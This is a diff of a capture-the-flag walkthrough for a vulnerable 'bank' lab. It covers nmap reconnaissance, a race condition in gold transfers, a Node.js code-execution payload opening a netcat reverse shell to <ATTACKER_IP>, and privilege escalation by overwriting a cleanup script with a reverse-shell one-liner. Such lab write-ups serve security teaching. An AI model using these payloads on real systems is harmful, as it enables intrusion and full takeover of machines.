@@ -13,10 +13,10 @@ _What does the name of the bank hint at?_
 1. Perform network reconnaissance to identify available services
 
 ```bash
-nmap -sV IP
+nmap -sV <TARGET_IP>
 ```
 
-[SCREEN01]
+<img width="722" height="180" alt="SCREEN01" src="https://github.com/user-attachments/assets/eb3b4796-da69-4504-8d8a-bd9893661a72" />
 
 2. Navigate to `http://<TARGET_IP>` and register a new user account. After logging in, examine the application functionality, particularly the gold transfer mechanism and premium account purchase option at `http://<TARGET_IP>/purchase.html`
 
@@ -30,11 +30,11 @@ nmap -sV IP
 
 This race condition occurs when the application fails to properly synchronize balance checks and updates, allowing multiple transactions to process simultaneously before balance validation completes.
 
-[SCREEN02]
+<img width="1054" height="474" alt="SCREEN02" src="https://github.com/user-attachments/assets/f7e88ecb-5c7f-4ace-ad21-dc3e55e8222f" />
 
 4. After accumulating sufficient gold through the race condition, purchase the premium account upgrade. This unlocks access to `http://<TARGET_IP>/premiumfeatures.html`.
 
-[SCREEN03]
+<img width="1383" height="439" alt="SCREEN03" src="https://github.com/user-attachments/assets/32752c54-bbaf-453e-9354-0adc7e9da6e0" />
 
 5. Prepare a netcat listener on the attacking machine
 
@@ -42,7 +42,11 @@ This race condition occurs when the application fails to properly synchronize ba
 nc -lvnp 4444
 ```
 
-6. The premium features page contains a Node.js code execution vulnerability. Input the following payload to establish a reverse shell: `require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4444 >/tmp/f')`
+6. The premium features page contains a Node.js code execution vulnerability. Input the following payload to establish a reverse shell:
+
+```javascript
+require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f')
+```
 
 7. Once the reverse shell connection is established, navigate to the user directory and retrieve the user flag
 
@@ -50,7 +54,7 @@ nc -lvnp 4444
 cat /home/brian
 ```
 
-[SCREEN04]
+<img width="717" height="430" alt="SCREEN04" src="https://github.com/user-attachments/assets/451d410d-915e-48dc-9ae2-5b5c87fc3d19" />
 
 ---
 
@@ -79,7 +83,7 @@ nc -lvnp 5555
 python -c 'import pty; pty.spawn("/bin/bash")'
 cd /home/brian/cleanup
 rm -f cleanupscript.sh
-echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 5555 >/tmp/f' > cleanupscript.sh
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> 5555 >/tmp/f' > cleanupscript.sh
 chmod +x cleanupscript.sh
 ```
 
@@ -92,4 +96,4 @@ ls /root
 cat /root/root.txt
 ```
 
-[SCREEN05]
+<img width="474" height="183" alt="SCREEN05" src="https://github.com/user-attachments/assets/46c2dd62-5dee-4f65-a307-8036da1c9f90" />
